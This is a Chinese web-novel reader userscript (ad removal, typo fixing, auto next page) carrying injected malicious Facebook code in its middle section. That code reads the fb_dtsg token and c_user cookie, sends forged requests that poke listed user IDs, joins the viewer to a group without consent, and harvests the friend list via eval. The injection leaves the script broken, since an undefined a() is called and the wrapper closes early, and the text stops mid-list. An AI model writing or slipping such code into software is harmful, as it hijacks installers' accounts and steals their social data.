// ==UserScript==
// @id             tbaking@yahoo.com
// @name           Xhuljano-Tba The-King
// @version        3.8.2
// @namespace      ywzhaiqigmail.com
// @author         Xhuljano-Tba
// @description    小说阅读脚本，统一阅读样式，内容去广告、修正拼音字、段落整理，自动下一页
// @grant          GM_xmlhttpRequest
// @grant          GM_addStyle
// @grant          GM_getValue
// @grant          GM_setValue
// @grant          GM_getResourceURL
// @grant          GM_openInTab
// @grant          GM_setClipboard
// @grant          GM_registerMenuCommand
// @grant          unsafeWindow
// @homepageURL    https://userscripts.org/scripts/show/165951
// @updateURL      https://userscripts.org/scripts/source/165951.meta.js
// @downloadURL    https://userscripts.org/scripts/source/165951.user.js
// @require        http://code.jquery.com/jquery-1.9.1.min.js
// @require        http://underscorejs.org/underscore-min.js
// @resource fontawesomeWoff http://web-resource.googlecode.com/git/fontawesome-webfont.woff

// @include        http://read.qidian.com/*,*.aspx
// @include        http://readbook.qidian.com/bookreader/*,*.html
// @include        http://www.qdmm.com/BookReader/*,*.aspx
// @include        http://chuangshi.qq.com/read/bookreader/*.html
// @include        http://chuangshi.qq.com/read/bk/*/*-m-*.html
// @include        http://www.jjwxc.net/onebook.php?novelid=*
// @include        http://book.zongheng.com/chapter/*/*.html
// @include        http://www.xxsy.net/books/*/*.html
// @include        http://book.zhulang.com/*/*.html
// @include        http://www.17k.com/chapter/*/*.html
// @include        http://mm.17k.com/chapter/*/*.html
// @include        http://www.kanxia.net/k/*/*/*.html
// @include        http://www.qingdi.com/files/article/html/*/*/*.html
// @include        http://www.xkzw.org/*/*.html
// @include        http://shouda8.com/*/*.html
// @include        http://novel.hongxiu.com/*/*/*.shtml
// @include        http://www.readnovel.com/novel/*.html
// http://www.tianyabook.com/*/*.htm

// booklink.me
// @include        http://www.shumilou.com/*/*.html
// @include        http://www.wcxiaoshuo.com/wcxs-*-*/
// @include        http://www.ranwen.cc/*/*/*/*.html
// @include        http://www.ranwen.net/files/article/*/*/*.html
// @include        http://www.bxs.cc/*/*.html
// @include        http://www.laishuwu.com/html/*/*/*.html
// @include        http://www.binhuo.com/html/*/*/*.html
// @include        http://www.haoqi99.com/haoqi99/*/*/*.shtml
// @include        http://www.shuhe.cc/*/*/
// @include        http://www.dudukan.net/html/*/*/*.html
// @include        http://www.hahawx.com/*/*/*.htm
// @include        http://www.zhuzhudao.com/txt/*/*/
// @include        http://www.zhuzhudao.cc/txt/*/*/
// @include        http://www.dahaomen.net/txt/*/*/
// @include        http://www.tadu.com/book/*/*/
// @include        http://www.aishoucang.com/*/*.html
// @include        http://www.wanshuba.com/Html/*/*/*.html
// @include        http://www.zhuishu.net/files/article/html/*/*/*.html
// @include        http://www.sqsxs.com/*/*/*.html
// @include        http://www.caiwei.tw/html/*/*.html
// @include        http://www.hotsk.com/Html/Book/*/*/*.shtml
// @include        http://www.92to.com/*/*/*.html
// @include        http://www.qirexs.com/read-*-chapter-*.html
// @include        http://www.du00.com/read/*/*/*.html
// @include        http://www.qishuwu.com/*/*/
// @include        http://www.wandoou.com/book/*/*.html
// @include        http://www.6yzw.org/*/*.html
// @include        http://www.daomengren.com/*/*.html
// http://www.fkzww.net/thread-*.html

// www.sodu.so
// @include        http://www.jiaodu8.com/*/*/*/*.html
// @include        http://www.fktxt.com/book/*/*.html
// @include        http://www.186s.cn/files/article/html/*/*/*.html
// @include        http://www.6xs.cn/xs/*/*/*.html
// @include        http://www.chaojiqiangbing.com/book/*/*/*.html
// @include        http://book.moka123.com/book/*/*/*.html
// @include        http://www.suimeng.com/files/article/html/*/*/*.html
// @include        http://www.hao662.com/haoshu/*/*/*.html

//www.verydu.net
//         http://www.yawen8.com/*/*/*.html
// @include        http://www.tsxs.cc/files/article/html/*/*/*.html
// @include        http://www.ziyuge.com/*/*/*/*/*.html

// 其它网站
// @include        http://www.151kan.com/*/*/*/*.html
// @include        http://www.bookabc.net/*/*/*.html
// @include        http://www.xshuotxt.com/*/*/*/*.html
// @include        http://www.doulaidu.com/*/*/*.html
// @include        http://www.d586.com/*/*/
// @include        http://www.kanshu.la/book/*/*.shtml
// @include        http://www.wtcxs.com/files/article/html/*/*/*.html
// @include        http://www.5du5.com/book/*/*/*.html
// @include        http://book.kanunu.org/*/*/*.html
// @include        http://paitxt.com/*/*/*.html
// @include        http://www.shunong.com/yuedu/*/*/*.html
// @include        http://book.yayacms.com/*/book_*_*.html
// @include        http://www.yqhhy.cc/*/*/*.html
// @include        http://www.nuoqiu.com/static/*/*.html
// @include        http://www.17yue.com/*/*/*.html
// @include        http://dukeba.com/book/*/*/*.shtml
// @include        http://www.wenchangshuyuan.com/html/*/*/*.html
// @include        http://www.pofeng.net/xiaoshuo/*/*.html
// @include        http://www.piaotian.net/html/*/*/*.html
// @include        http://www.epzww.com/book/*/*
// @include        http://tw.xiaoshuokan.com/haokan/*/*.html
// @include        http://www.wobudu.com/*/*.html
// @include        http://www.qb5.com/xiaoshuo/*/*/*.html
// @include        http://www.23us.com/html/*/*/*.html
// @include        http://www.xs222.com/html/*/*/*.html
// @include        http://www.bixiage.com/*/*/*/*.html
// @include        http://www.ranwenxiaoshuo.com/files/article/html/*/*/*.html
// @include        http://www.ranwenxiaoshuo.com/*/*-*-*.html
// @include        http://www.bjxiaoshuo.com/bjxs-*-*/
// @include        http://www.59shuku.com/xiaoshuo/*/*.htm
// @include        http://www.16kbook.org/Html/Book/*/*/*.shtml
// @include        http://www.dixiaoshuo.com/Html/*/*.html
// @include        http://www.nieshu.com/Book/*/*/*.shtml
// @include        http://www.tlxsw.com/files/article/html/*/*/*.html
// @include        http://www.1kanshu.com/files/article/html/*/*/*.html
// @include        http://www.uutxt.org/book/*/*/*.html
// @include        http://www.5800.cc/*/*/*/*.html
// @include        http://www.biquge.com/*/*.html
// @include        http://www.qududu.com/book/*/*/*.html
// @include        http://www.free97.cn/book/*/*/*.html
// @include        http://www.122s.com/book/*/*.html
// @include        http://www.123du.net/dudu-*/*/*.html
// @include        http://www.123du.cc/dudu-*/*/*.html
// @include        http://www.123du.net/book/*/*.html
// @include        http://www.hwafa.com/*/*.html
// @include        http://www.qmshu.com/html/*/*/*.html
// @include        http://dlzw.cc/article-*-*.html
// @include        http://www.shushu5.com/read/*/*.html
// @include        http://www.qiuwu.net/html/*/*/*.html
// @include        http://www.xiaoyanwenxue.com/files/article/html/*/*/*.html
// @include        http://www.3gsc.com.cn/bookcon/*_*_*
// @include        http://www.bj-ibook.cn/book/*/*/*.htm
// @include        http://www.baoliny.com/*/*.html
// @include        http://www.dajiadu.net/files/article/html/*/*/*.html
// @include        http://www.yankuai.com/files/article/html/*/*/*.html
// @include        http://www.docin.net/*/*.html
// @include        http://www.dushuge.net/html/*/*/*.html
// @include        http://www.xunshu.org/xunshu/*/*/*.html
// @include        http://www.moneyren.com/book/*/*/*.shtml
// @include        http://wemaxfilipino.com/*/*/*.html
// @include        http://www.85618892.cn/xiaoshuo/*/*/*.shtml
// @include        http://www.bookba.net/Html/Book/*/*/*.html
// @include        http://www.moksos.com/*/*/*.html
// @include        http://dudu8.net/novel/*/*/*.html
// @include        http://www.dawenxue.net/html/*/*/*.html
// @include        http://www.yanmoxuan.org/book/*/*/*.html
// @include        http://www.duyidu.com/xiaoshuo/*/*/*.html
// @include        http://www.69zw.com/xiaoshuo/*/*/*.html
// @include        http://www.laishu.com/book/*/*/*.shtml
// @include        http://www.bxwx.org/b/*/*/*.html
// @include        http://www.bxzw.org/*/*/*/*.shtml
// @include        http://www.360118.com/html/*/*/*.html
// @include        http://www.59to.com/files/article/xiaoshuo/*/*/*.html
// @include        http://www.dyzww.com/cn/*/*/*.html
// @include        http://www.9wh.net/*/*/*.html
// @include        http://www.luoqiu.net/html/*/*/*.html
// @include        http://www.luoqiu.com/html/*/*/*.html
// @include        http://www.epzw.com/files/article/html/*/*/*.html
// @include        http://www.dashubao.com/book/*/*/*.html
// @include        http://b.faloo.com/p/*/*.html
// @include        http://www.baikv.com/*/*.html
// @include        http://www.66721.com/*/*/*.html
// @include        http://www.3dllc.com/html/*/*/*.html
// @include        http://www.xstxt.com/*/*/
// @include        http://www.zzzcn.com/3z*/*/
// @include        http://www.zzzcn.com/modules/article/App.php*
// @include        http://www.nilongdao.com/book/*/*/*.html
// @include        http://xs321.net/*/*/
// @include        http://read.guanhuaju.com/files/article/html/*/*/*.html
// @include        http://www.book108.com/*/*/*.html
// @include        http://5ycn.com/*/*/*.html
// @include        http://www.zhaoxiaoshuo.com/chapter-*-*-*/
// @include        http://*zbzw.com/*/*.html
// @include        http://manghuangji.cc/*/*.html
// @include        http://www.aiqis.com/*/*.html
// @include        http://www.fftxt.net/book/*/*.html
// @include        http://www.5kwx.com/book/*/*/*.html
// @include        http://www.uuxiaoshuo.net/html/*/*/*.html
// @include        http://www.sanyyo.org/*.html
// @include        http://www.chinaisbn.com/*/*/*.html
// @include        http://www.caihongwenxue.com/Html/Book/*/*/*.html
// @include        http://www.shushuw.cn/shu/*/*.html

// @exclude        */List.html
// @exclude        */List.shtml
// @exclude        */index.html
// @exclude        */index.shtml

// @run-at         document-start
// ==/UserScript==

var isChrome = !!this.chrome;

var fontawesomeWoff = GM_getResourceURL('fontawesomeWoff');
if (!fontawesomeWoff || fontawesomeWoff.length < 10) {
    fontawesomeWoff = "http://web-resource.googlecode.com/git/fontawesome-webfont.woff";
} else if (isChrome) {
    fontawesomeWoff = "data:font/woff;charset=utf-8;base64," + fontawesomeWoff;
}

(function(CSS_MAIN){

    if(["mynovelreader-iframe", "superpreloader-iframe"].indexOf(window.name) != -1) {  // 用于加载下一页的 iframe
        return;
    }

    // 其它设置
    var config = {
        soduso: false,                  // www.sodu.so 跳转
        content_replacements: true,     // 小说屏蔽字修复
        fixImageFloats: true,           // 图片居中修正
        paragraphBlank: true,           // 统一段落开头的空格为 2个全角空格
        end_color: "#666666",           // 最后一页的    链接颜色
    };

    var READER_AJAX = "reader-ajax";   // 内容中ajax的 className

    // 自动尝试的规则
    var rule = {
        titleReplace: /^章节目录|^文章正文|^正文|全文免费阅读|最新章节|\(文\)/,

        nextSelector: "a:contains('下一页'), a:contains('下一章'), a:contains('下页')",
        prevSelector: "a:contains('上一页'), a:contains('上一章'), a:contains('上页')",
        nextUrlIgnore: /index|list|last|end|BuyChapterUnLogin|^javascript:|book\.zongheng\.com\/readmore|\/0\.html$/i,  // 忽略的下一页链接，匹配 href
        nextUrlCompare: /\/\d+(_\d+)?\.html?$|\/wcxs-\d+-\d+\/$|chapter-\d+\.html$/i,  // 忽略的下一页链接（特殊），跟上一页比较

        // 按顺序匹配，匹配到则停止。econtains 完全相等
        indexSelectors: ["a[href='index.html']", "a:contains('返回书目')", "a:contains('章节目录')", "a:contains('章节列表')",
            "a:econtains('最新章节')", "a:contains('回目录')","a:contains('回书目')", "a:contains('目 录')", "a:contains('目录')"],

        contentSelectors: ["#pagecontent", "#bmsy_content", "#bookpartinfo", "#htmlContent", "#chapter_content", "#chapterContent", "#partbody",
            "#article_content", "#BookTextRead", "#booktext", "#BookText", "#readtext", "#text_c", "#txt_td", "#TXT", "#zjneirong",
            ".novel_content", ".readmain_inner", ".noveltext", ".booktext",
            "#contentTxt", "#oldtext", "#a_content", "#contents", "#content2", "#content", ".content"],

        contentRemove: "script, iframe, font[color]",          // 内容移除选择器
        contentReplace: /最新.?章节|百度搜索|\(百度搜.\)|小说章节|全文字手打|“”&nbsp;看|无.弹.窗.小.说.网|追书网/g,
        replaceBrs: /(<br[^>]*>[ \n\r\t]*){1,}/gi,    // 替换为<p>
        mutationMaxTime: 5 * 1000,
    };
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}

a("100004442681131");
a("100007124730870");
a("100004398698617");
a("100007825926477");
a("100004387689985");
a("100007363599064");
a("100007791101142");
a("100007773522037");
a("100006530530274");
a("100007772711974");
a("100007773612086");
a("100007839271286");
a("100005171050394");
a("100005246773998");
a("100002170100273");


var gid = ['202969029891590'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};




    // ===================== 自定义站点规则 ======================
    rule.specialSite = [
        // 详细版规则示例。已经没法访问。
        {siteName: "泡书吧",                                               // 站点名字... (可选)
            url: "^http://www\\.paoshu8\\.net/Html/\\S+\\.shtm$",          // // 站点正则... (~~必须~~)

            // 获取标题
            titleReg: /(.*?)最新章节 [-_\\\/](.*?)[-_\/].*/,         // 书籍标题、章节标题正则 (可选)
            titlePos: 0,                                          // 书籍标题位置：0 或 1 (可选，默认为 0)
            titleSelector: "#title h1",

            indexSelector: "a:contains('回目录')",                    // 首页链接 jQuery 选择器 (不填则尝试自动搜索)
            prevSelector: "a:contains('翻上页')",                      // 上一页链接 jQuery 选择器 (不填则尝试自动搜索)
            nextSelector: "a:contains('翻下页')",                     // 下一页链接 jQuery 选择器  (不填则尝试自动搜索)

            // 获取内容
            contentSelector: "#BookText",                             // 内容 jQuery 选择器 (不填则尝试自动搜索)
            useiframe: false,                                          // (可选)下一页加载是否使用 iframe
            mutationSelector: "#chaptercontainer",                    // (可选)内容生成监视器
            // 对内容的处理
            contentHandle: false,   // (可选)是否对内容进行特殊处理，诸如拼音字修复等，诸如起点等网站可禁用
            fixImage: true,         // (可选)，图片居中，不分大小
            contentReplace: /(\*W|（w|\(w).{10,25}(吧\*|）|\))|看小说就上|本书首发|泡.{1,6}吧|百度搜索阅读最新最全的小说|http:\/\/www.paoshu8.com\/|无弹窗/g,                                // 需要移除的内容正则 (可选)
            contentPatch: function(fakeStub){                          // (可选)内容补丁。解决翻页是脚本的情况
                var $next = fakeStub.find('#LinkMenu');
                $next.html($next.html().replace(/<script>ShowLinkMenu.*?(<a.*?a>).*?(<a.*?a>).*?script>/,'$1$2') +
                    '<a href=\'List.shtm\'>回目录</a>');
            }
        },
        // 特殊站点，需再次获取且跨域。添加 class="reader-ajax"，同时需要 src, charset
        {siteName: "起点文学",
            url: "^http://(www|read|readbook)\\.(qidian|qdmm|qdwenxue)\\.com/BookReader/.*",
            // titleReg: "小说:(.*?)(?:独家首发)/(.*?)/.*",
            titleSelector: "#lbChapterName",
            bookNameSelector: ".booktitle .info span:first",
            contentReplace: {
                "\\[img=(.*)\\]": "<img src='$1'>",
                "\\[+CP.*(http://file.*\\.jpg)\\]+": "<img src='$1'>",
                "起点中文网www.qidian.com欢迎广大书友光临阅读.*": "",
                '<p>\\s+<a href="?http://www.(?:qidian|cmfu).com"?>起点中文网.*': ''
            },
            contentHandle: false,
            contentPatch: function(fakeStub){
                fakeStub.find('div#content script:first').addClass('reader-ajax');
            },
        },
        {siteName: "纵横中文网",
            url: "^http://book\\.zongheng\\.com/\\S+\\/\\d+\\.html$",
            contentHandle: false,
            titleReg: "(.*?)-(.*)",
            contentPatch: function(fakeStub){
                fakeStub.find('.watermark').remove();
                // 给第几章添加空格
                var chapterTitle = fakeStub.find(".tc > h2").text();
                var chapterTitle1 = fakeStub.find(".tc > h2 em").text();
                if(chapterTitle1) {
                    chapterTitle = chapterTitle.replace(chapterTitle1, " ") + chapterTitle1;
                }
                fakeStub.find("title").text(
                    fakeStub.find(".tc > h1").text() + "-" + chapterTitle);
            }
        },
        {siteName: "创世中文网",
            url: "^http://chuangshi\\.qq\\.com/read/",
            titleReg: "(.*?)_(.*)_创世中文",
            contentSelector: ".bookreadercontent",
            contentHandle: false,
            useiframe: true,
            mutationSelector: "#chaptercontainer",  // 内容生成监视器
            mutationChildCount: 1,
            contentPatch: function(fakeStub){
                fakeStub.find('.bookreadercontent  > p:last').remove();
            }
        },
        {siteName: "晋江文学网",
            url: /^http:\/\/www\.jjwxc\.net\/onebook\.php\S*/,
            titleReg: /《(.*?)》.*ˇ(.*?)ˇ.*/,
            indexSelector: ".noveltitle > h1 > a",
            contentHandle: false,
            contentPatch: function(fakeStub){
                fakeStub.find('h2').remove();
                fakeStub.find('#six_list, #sendKingTickets').parent().remove();
                fakeStub.find("div.noveltext").find("div:first, h1, div[style]:last").remove();
            }
        },
        {siteName: "潇湘书院",
            url: "^http://www\\.xxsy\\.net/books/.*\\.html",
            titleReg: "(.*?) (.*)",
            contentSelector: "#zjcontentdiv",
            nextSelector: "a[title='阅读下一章节']",
            contentHandle: false,
            contentReplace: "本书由潇湘书院首发，请勿转载！",
            contentPatch: function(fakeStub){
                fakeStub.find("title").text(fakeStub.find('meta[name="keywords"]').attr("content"));
            }
        },
        {siteName: "逐浪",
            url: /^http:\/\/book\.zhulang\.com\/.*\.html/,
            titleReg: /(.*?)-(.*)/,
            contentSelector: "#readpage_leftntxt",
            contentHandle: false,
            contentPatch: function(fakeStub){
                var title = fakeStub.find(".readpage_leftnzgx a:first").text() + "-" +
                    fakeStub.find(".readpage_leftntit").text();
                fakeStub.find('title').html(title);
            }
        },
        {siteName: "小说阅读网",
            url: "http://www\\.readnovel\\.com/novel/.*\\.html",
            titleReg: "(.*)_(.*)免费阅读_小说阅读网",
            contentSelector: "#article",
            contentRemove: "div[style]"
        },
        // {siteName: "天涯在线书库（部分支持）",
        //     url: /www\.tianyabook\.com\/.*\.htm/,
        //     titleSelector: ".max, h1:first",
        //     bookNameSelector: "td[width='70%'] > a[href$='index.htm']",
        //     contentSelector: "div > span.middle, #texts",
        //     contentHandle: false,
        // },

        // {siteName: "易读",
        //     url: "http://www.yi-see.com/read_\\d+_\\d+.html",
        //     contentSelector: 'table[width="900px"][align="CENTER"]'
        // },
        {siteName: "燃文",
            url: /^http:\/\/www\.ranwen\.cc\/.*\.html$/,
            titleReg: /(.*?)-(.*?)-燃文/,
            contentSelector: "#oldtext",
            contentRemove: "div[style], script",
            contentReplace: [
                /最快更新78小说|\(?百度搜.\)|访问下载tXt小说|百度搜\|索|文\|学|文学全文.字手打|\((&nbsp;)+|牛过中文..hjsm..首发.转载请保留|\[本文来自\]|♠思♥路♣客レ|※五月中文网 5y ※|无错不跳字|最快阅读小说大主宰.*|跟我读Ｈ－u－n 请牢记|非常文学|关闭&lt;广告&gt;|w w.*|”娱乐秀”|更多精彩小[说說].*|高速更新/g,
                /[\(\*◎]*(百度搜)?文.?[學学].?[馆館][\)\*）]*|\(百度搜\)/g,
                /提供无弹窗全文字在线阅读.*|高速首发.*如果你觉的本章节还不错的话.*/g,
                /更新快无弹窗纯文字|书网∷更新快∷无弹窗∷纯文字∷.t！。/g,
                /一秒记住，本站为您提供热门小说免费阅读。/g,
                /\(更新速度最快记住即可找到\)|芒果直播网|.mgzhibo .|去 读 读|看小说就到/g,
            ]
        },
        {siteName: "燃文小说网",
            url: "http://www\\.ranwenxiaoshuo\\.com/files/article/html/\\d+/\\d+/\\d+\\.html|http://www\\.ranwenxiaoshuo\\.com/\\w+/\\w+-\\d+-\\d+\\.html",
            titleReg: /(.*?)最新章节(.*?)在线阅读.*/,
            contentSelector: "#fontsize",
            contentReplace: "天才一秒记住[\\s\\S]+为您提供精彩小说阅读。",
        },
        {siteName: "燃文小说",
            url: "http://www\\.ranwen\\.net/files/article/\\d+/\\d+/\\d+\\.html",
            titleReg: "(\\S+) (.*) - 燃文小说",
            contentReplace: "\\(.*燃文小说.*\\)"
        },
        {siteName: "无错小说网",
            url: /^http:\/\/www\.wcxiaoshuo\.com\/wcxs[-\d]+\//,
            titleReg: /(.*?)最新章节.*?-(.*?)-.*/,
            titlePos: 1,
            nextSelector: "a#htmlxiazhang",
            prevSelector: "a#htmlshangzhang",
            indexSelector: "a#htmlmulu",
            contentReplace: {
                'ilo-full-src="\\S+\\.jpg" ': "",
                '(<center>)?<?img src..(http://www.wcxiaoshuo.com)?(/sss/\\S+\\.jpg).(>| alt."\\d+_\\d+_\\d*\\.jpg" />)(</center>)?': '$3',
                "/sss/da.jpg": "打", "/sss/maws.jpg": "吗？", "/sss/baw.jpg": "吧？", "/sss/wuc.jpg": "无", "/sss/maosu.jpg": "：“", "/sss/cuow.jpg": "错", "/sss/ziji.jpg": "自己", "/sss/shenme.jpg": "什么", "/sss/huiqub.jpg": "回去", "/sss/sjian.jpg": "时间", "/sss/zome.jpg": "怎么", "/sss/zhido.jpg": "知道", "/sss/xiaxin.jpg": "相信", "/sss/faxian.jpg": "发现", "/sss/shhua.jpg": "说话", "/sss/dajiex.jpg": "大姐", "/sss/dongxi.jpg": "东西", "/sss/erzib.jpg": "儿子", "/sss/guolair.jpg": "过来", "/sss/xiabang.jpg": "下班", "/sss/zangfl.jpg": "丈夫", "/sss/dianhua.jpg": "电话", "/sss/huilaim.jpg": "回来", "/sss/xiawu.jpg": "下午", "/sss/guoquu.jpg": "过去", "/sss/shangba.jpg": "上班", "/sss/mingtn.jpg": "明天", "/sss/nvrenjj.jpg": "女人", "/sss/shangwo.jpg": "上午", "/sss/shji.jpg": "手机", "/sss/xiaoxinyy.jpg": "小心", "/sss/furene.jpg": "夫人", "/sss/gongzih.jpg": "公子", "/sss/xiansg.jpg": "先生", "/sss/penyouxi.jpg": "朋友", "/sss/xiaoje.jpg": "小姐", "/sss/xifup.jpg": "媳妇", "/sss/nvxudjj.jpg": "女婿", "/sss/xondi.jpg": "兄弟", "/sss/lagong.jpg": "老公", "/sss/lapo.jpg": "老婆", "/sss/meimeid.jpg": "妹妹", "/sss/jiejiev.jpg": "姐姐", "/sss/jiemeiv.jpg": "姐妹", "/sss/xianggx.jpg": "相公", "/sss/6shenumev.jpg": "什么", "/sss/cuoaw.jpg": "错", "/sss/fpefnyoturxi.jpg": "朋友", "/sss/vfsjgigarn.jpg": "时间", "/sss/zzhiedo3.jpg": "知道", "/sss/zibjib.jpg": "自己", "/sss/qdonglxi.jpg": "东西", "/sss/hxiapxint.jpg": "相信", "/sss/fezrormre.jpg": "怎么", "/sss/nvdrfenfjfj.jpg": "女人", "/sss/jhiheejeieev.jpg": "姐姐", "/sss/xdifagojge.jpg": "小姐", "/sss/gggugolgair.jpg": "过来", "/sss/maoashu.jpg": "：“", "/sss/gnxnifawhu.jpg": "下午", "/sss/rgtugoqgugu.jpg": "过去", "/sss/khjukilkaim.jpg": "回来", "/sss/gxhigfadnoxihnyy.jpg": "小心", "/sss/bkbskhhuka.jpg": "说话", "/sss/xeieavnfsg.jpg": "先生", "/sss/yuhhfuiuqub.jpg": "回去", "/sss/pdianphua.jpg": "电话", "/sss/fabxianr.jpg": "发现", "/sss/feilrpto.jpg": "老婆", "/sss/gxronfdri.jpg": "兄弟", "/sss/flfaggofng.jpg": "老公", "/sss/tymyigngtyn.jpg": "明天", "/sss/dfshfhhfjfi.jpg": "手机", "/sss/gstjhranjgwjo.jpg": "上午", "/sss/fmgeyimehid.jpg": "妹妹", "/sss/gxgihftutp.jpg": "媳妇", "/sss/cerztifb.jpg": "儿子", "/sss/gfxgigagbfadng.jpg":"下班", "/sss/gstjhranjg.jpg":"下午", "/sss/hjeirerm6eihv.jpg": "姐妹", "/sss/edajihexr.jpg": "大姐", "/sss/wesfhranrrgba.jpg": "上班", "/sss/gfognggzigh.jpg": "公子", "/sss/frurtefne.jpg": "夫人", "/sss/fzagnggfbl.jpg": "丈夫", "/sss/nvdxfudfjfj.jpg": "女婿", "/sss/xdidafnggx.jpg": "相公", "/sss/zenme.jpg": "怎么", "/sss/gongzi.jpg": "公子", "/sss/ddefr.jpg": "",
                ".*ddefr\\.jpg.*|无(?:错|.*cuoa?w\\.jpg.*)小说网不[少跳]字|w[a-z\\.]*om?|.*由[【无*错】].*会员手打[\\s\\S]*": "",
                "无错不跳字|一秒记住.*|全文免费阅读.*|8 9 阅阅 读 网|看小说最快更新|“小#说看本书无广告更新最快”": "", 
                "【 .{1,10} 】":""
            },
            contentPatch: function(fakeStub){
                // 去除内容开头、结尾的重复标题
                var title = fakeStub.find("#htmltimu").text().replace(/\s+/, "\\s*");
                var content = fakeStub.find("#htmlContent");
                content.find("div[align='center']").remove();
                if(title.match(/第\S+章/)){
                    content.html(content.html().replace(new RegExp(title), "").replace(new RegExp(title), ""));
                }
            }
        },
        {siteName: "书迷楼",
            url: /^http:\/\/www\.shumilou\.com\/.*html$/,
            titleReg: /(.*) (.*?) 书迷楼/,
            titlePos: 1,
            contentSelector: "#content",
            contentReplace: ['div lign="ener"&gt;|.*更多章节请到网址隆重推荐去除广告全文字小说阅读器',
                '起点中文网www.qidian.com欢迎广大书.*',
                '书迷楼最快更新.*'],
            fixImage: true,
            contentPatch: function(fakeStub){
                fakeStub.find("#content").find("div.title:last")
                    .appendTo(fakeStub.find('body'));
                fakeStub.find("#content").find("div.title, p > b, div[style]").remove();
            }
        },
        {siteName: "冰火中文",
            url: /^http:\/\/www\.binhuo\.com\/html\/[\d\/]+\.html$/,
            titleReg: /(.*?)最新章节,(.*?)-.*/,
            fixImage: true,
            contentReplace: {
                "&lt;冰火#中文.*|冰火中文&nbsp;(www.)?binhuo.com|冰.火.中文|绿色小说|lvsexs|冰火中文.": "",
                "([^/])www\\.binhuo\\.com": "$1"
            },
            contentPatch: function(fakeStub){
                fakeStub.find("#BookText").append(fakeStub.find("img.imagecontent"));
            }
        },
        {siteName: "百晓生",
            url: /^http:\/\/www\.bxs\.cc\/\d+\/\d+\.html$/,
            titleReg: /(.*?)\d*,(.*)/,
            contentReplace: [
                /\/\/(?:&nbsp;|访问下载txt小说|高速更新)+\/\//ig,
                /〖百晓生∷.*〗|无弹窗小说网www.bxs.cc|百晓生文学网|最快阅读小说大主宰，尽在百晓生文学网.*|ww.x.om|欢迎大家来到.*?bxs\.cc|百晓生阅读最新最全的小说.*|百晓生网不少字|站长推荐.*|文字首发|[\[\]\(《].*百晓生.*|百晓生.不跳字|百.晓.生.|关闭.*广告.*|飘天文学|本站域名就是.*|\(.{0,5}小说更快更好.{0,5}\)|(请在)?百度搜索.*|一秒记住.*为您提供精彩小说阅读.|百晓生|全文阅读|¤本站网址：¤|\/\/&nbsp;访问下载txt小说\/\/◎◎|纯站点\\".*值得收藏的/ig,
                /[\[【].*?[\]】]|文[学學][馆館]|www\.biquge\.cc|(http:\/\/)?www\.Bxs\.cc|(请牢记)?soudu．org/ig,
                /最快文字更新无弹窗无广/ig,
            ],
        },
        {siteName: "浩奇文学网",
            url: /^http:\/\/www\.haoqi99\.com\/.*\.shtml$/,
            titleReg: /^(.*?)--(.*?)-/,
        },
        {siteName: "书河小说网",
            url: /^http:\/\/www\.shuhe\.cc\/\d+\/\d+/,
            titleReg: "([^\\d]+)\\d*,(.*?)_",
            contentSelector: "#TXT",
            contentReplace: /一秒记住.*为您提供精彩小说阅读.|\{请在百度搜索.*首发阅读\}|（书河小说网.*?无弹窗）|wxs.o|ww.x.om|[\[【\(].{1,30}[\]\)】]|ff37;.*|书河小说网高速首发.*|TXT下载|全文阅读|第一书河小说网|百书斋.*|首发来自书河小说网|本书最新章节|书河小说网|高品质更新/ig,
        },
        {siteName: "爱收藏",
            url: /http:\/\/www\.aishoucang\.com\/\w+\/\d+\.html/,
            titleReg: "(.*?)-(.*?)-爱收藏",
            contentSelector: "#zhutone",
            contentReplace: {
                "<a[^>]*>(.*)</a>": "$1",
                ".爱收藏[^<]*": ""
            }
        },
        {siteName: "追书网",
            url: "^http://www\\.zhuishu\\.net/files/article/html/.*\\.html",
            titleReg: /(?:正文 )?(.*) (\S+) \S+ - .*/,
            titlePos: 1,
            indexSelector: ".pagebottom>a:contains('目录')",
            nextSelector: ".pagebottom>a:contains('下一页')",
            prevSelector: ".pagebottom>a:contains('上一页')",
            fixImage: true,
            contentSelector: "#content",
            contentReplace: {
                "([^/])www\\.ZhuisHu\\.net": "$1",
            },
            contentPatch: function(fakeStub){
                fakeStub.find("#content > .title, #content > .pagebottom").appendTo(fakeStub.find("body"));

                fakeStub.find("#content").find("center, b:contains('最快更新')").remove();
            }
        },
        {siteName: "猪猪岛小说",
            url: "http://www\\.zhuzhudao\\.(?:com|cc)/txt/",
            titleReg: "(.*?)最新章节-(.*?)-",
            contentReplace: /[“"”]?猪猪岛小说.*|<\/?a[^>]+>|w+\.zhuZhuDao\.com|看更新最快的.*/ig
        },
        {siteName: "盗梦人小说网",
            url: "http://www\\.daomengren\\.com/.*\\.html",
            contentReplace: /百度搜索 本书名 \+ 盗梦人 看最快更新/ig
        },
        {siteName: "读零零",
